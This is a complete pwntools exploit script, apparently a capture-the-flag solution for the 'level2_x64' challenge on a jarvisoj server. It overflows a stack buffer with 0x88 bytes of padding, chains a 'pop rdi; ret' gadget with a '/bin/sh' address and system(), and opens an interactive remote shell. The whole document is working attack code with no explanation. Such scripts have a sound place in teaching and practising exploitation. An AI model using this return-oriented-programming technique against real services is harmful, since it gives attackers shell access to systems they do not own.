#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *

io = remote("pwn2.jarvisoj.com",9882)
elf = ELF("./level2_x64")

sys_addr = elf.symbols["system"]
bin_addr = 0x600A90
rdi_ret = 0x4006B3

payload = ''
payload += 'a' * 0x88
payload += p64(rdi_ret)
payload += p64(bin_addr)
payload += p64(sys_addr)

io.recvline()
io.sendline(payload)
io.interactive()
io.close()
